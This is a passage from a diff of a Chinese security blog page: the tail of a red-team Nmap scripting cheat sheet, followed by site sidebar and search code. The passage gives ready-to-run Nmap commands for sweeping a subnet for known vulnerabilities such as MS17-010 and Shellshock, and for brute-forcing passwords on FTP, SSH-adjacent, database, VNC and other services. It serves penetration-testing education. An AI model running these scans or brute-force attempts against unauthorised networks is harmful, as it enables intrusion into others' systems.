+<td>$ nmap –script vnc-brute -p 5900 192.168.1.0/24</td>
+</tr>
+<tr>
+<td>pcanywhere-brute.nse</td>
+<td>爆破pcanywhere</td>
+<td>$ nmap -p 5631 –script=pcanywhere-brute 192.168.1.0/24</td>
+</tr>
+<tr>
+<td>nexpose-brute.nse</td>
+<td>爆破nexpose</td>
+<td>$ nmap –script nexpose-brute -p 3780 192.168.1.0/24</td>
+</tr>
+<tr>
+<td>shodan-api.nse</td>
+<td>配合shodan接口进行扫描</td>
+<td>$ nmap –script shodan-api –script-args ‘shodan-api.target=192.168.1.0/24,shodan-api.apikey=SHODANAPIKEY’</td>
+</tr>
+</tbody></table>
+<h3 id="0x05-扫描实战"><a href="#0x05-扫描实战" class="headerlink" title="0x05 扫描实战"></a>0x05 扫描实战</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">依据目标系统端口及服务，选取对应扫描脚本进行扫描探测</span><br></pre></td></tr></table></figure>
+
+<p><strong>目标C段常规漏洞扫描</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sT -Pn -v --script dns-zone-transfer.nse,ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-4221.nse,http-backup-finder.nse,http-cisco-anyconnect.nse,http-iis-short-name-brute.nse,http-put.nse,http-php-version.nse,http-shellshock.nse,http-robots.txt.nse,http-svn-enum.nse,http-webdav-scan.nse,iis-buffer-overflow.nse,iax2-version.nse,memcached-info.nse,mongodb-info.nse,msrpc-enum.nse,ms-sql-info.nse,mysql-info.nse,nrpe-enum.nse,pptp-version.nse,redis-info.nse,rpcinfo.nse,samba-vuln-cve-2012-1182.nse,smb-vuln-ms08-067.nse,smb-vuln-ms17-010.nse,snmp-info.nse,sshv1.nse,xmpp-info.nse,tftp-enum.nse,teamspeak2-version.nse 192.168.1.0/24</span><br></pre></td></tr></table></figure>
+
+<p><strong>目标C段弱口令爆破</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sT -v -Pn --script ftp-brute.nse,imap-brute.nse,smtp-brute.nse,pop3-brute.nse,mongodb-brute.nse,redis-brute.nse,ms-sql-brute.nse,rlogin-brute.nse,rsync-brute.nse,mysql-brute.nse,pgsql-brute.nse,oracle-sid-brute.nse,oracle-brute.nse,rtsp-url-brute.nse,snmp-brute.nse,svn-brute.nse,telnet-brute.nse,vnc-brute.nse,xmpp-brute.nse 192.168.1.0/24</span><br></pre></td></tr></table></figure>
+
+<h3 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF Reference"></a>0xFF Reference</h3><ul>
+<li><p><a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener">wikipedia/Transmission_Control_Protocol</a></p>
+</li>
+<li><p><a href="https://nmap.org/docs.html" target="_blank" rel="noopener">https://nmap.org/docs.html</a></p>
+</li>
+<li><p><a href="https://nmap.org/book/man.html" target="_blank" rel="noopener">https://nmap.org/book/man.html</a></p>
+</li>
+<li><p><a href="https://nmap.org/nsedoc/" target="_blank" rel="noopener">https://nmap.org/nsedoc/</a></p>
+</li>
+<li><p><a href="https://github.com/nmap/nmap/tree/master/scripts" target="_blank" rel="noopener">https://github.com/nmap/nmap/scripts</a></p>
+</li>
+<li><p><a href="http://www.nmap.com.cn/doc/manual.shtm" target="_blank" rel="noopener">http://www.nmap.com.cn/doc/manual.shtm</a></p>
+</li>
+<li><p><a href="https://www.oreilly.com/library/view/mastering-the-nmap/9781782168317/" target="_blank" rel="noopener">Mastering the Nmap Scripting Engine</a></p>
+</li>
+<li><p><a href="https://www.hackingarticles.in/category/nmap/" target="_blank" rel="noopener">https://www.hackingarticles.in/category/nmap/</a></p>
+</li>
+</ul>
+<hr>
+<center>本文涉及内容，仅限于网络安全从业者学习交流，切勿用于非法用途...
+</center>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Red-Team/" rel="tag"><i class="fa fa-tag"></i>
+
+ Red Team</a>
+          
+            <a href="/tags/Nmap/" rel="tag"><i class="fa fa-tag"></i>
+
+ Nmap</a>
+          
+            <a href="/tags/NSE/" rel="tag"><i class="fa fa-tag"></i>
+
+ NSE</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/posts/30803/" rel="prev" title="Sqlmap基础备忘录">
+                Sqlmap基础备忘录 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/hexo.png" alt="L0n9">
+            
+              <p class="site-author-name" itemprop="name">L0n9</p>
+              <p class="site-description motion-element" itemprop="description">問道遠兮，求索未止...</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/L0n9" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/_L0n9_" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-端口扫描"><span class="nav-text">0x01 端口扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-端口状态"><span class="nav-text">1. 端口状态</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-扫描方式"><span class="nav-text">2. 扫描方式</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#a-TCP-全连接扫描"><span class="nav-text">a. TCP 全连接扫描</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#b-TCP-SYN扫描"><span class="nav-text">b. TCP SYN扫描</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#c-TCP-ACK扫描"><span class="nav-text">c. TCP ACK扫描</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#d-TCP-Null扫描"><span class="nav-text">d. TCP Null扫描</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#e-TCP-Window扫描"><span class="nav-text">e. TCP Window扫描</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#f-TCP-FIN扫描"><span class="nav-text">f. TCP FIN扫描</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#g-TCP-Xmas扫描"><span class="nav-text">g. TCP Xmas扫描</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#h-UDP扫描"><span class="nav-text">h. UDP扫描</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-端口渗透"><span class="nav-text">3. 端口渗透</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Nmap基础"><span class="nav-text">0x02 Nmap基础</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-参数总结"><span class="nav-text">1. 参数总结</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-端口选项"><span class="nav-text">2. 端口选项</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-扫描实战"><span class="nav-text">3. 扫描实战</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-脚本引擎"><span class="nav-text">0x03 脚本引擎</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-脚本分类"><span class="nav-text">1. 脚本分类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-脚本选项"><span class="nav-text">2. 脚本选项</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-实用脚本"><span class="nav-text">0x04 实用脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-FTP扫描脚本"><span class="nav-text">1. FTP扫描脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-SSH扫描脚本"><span class="nav-text">2. SSH扫描脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-Telnet扫描脚本"><span class="nav-text">3. Telnet扫描脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-SMTP扫描脚本"><span class="nav-text">4. SMTP扫描脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-POP3扫描脚本"><span class="nav-text">5. POP3扫描脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-IMAP扫描脚本"><span class="nav-text">6. IMAP扫描脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-DNS利用脚本"><span class="nav-text">7. DNS利用脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8-SNMP扫描脚本"><span class="nav-text">8. SNMP扫描脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9-LDAP扫描脚本"><span class="nav-text">9. LDAP扫描脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#10-Web利用脚本"><span class="nav-text">10. Web利用脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#11-数据库利用脚本"><span class="nav-text">11. 数据库利用脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#12-VPN利用脚本"><span class="nav-text">12. VPN利用脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#13-SMB利用脚本"><span class="nav-text">13. SMB利用脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#14-其他脚本"><span class="nav-text">14. 其他脚本</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-扫描实战"><span class="nav-text">0x05 扫描实战</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0xFF-Reference"><span class="nav-text">0xFF Reference</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">L0n9</span>
+
+  
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "./public/search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
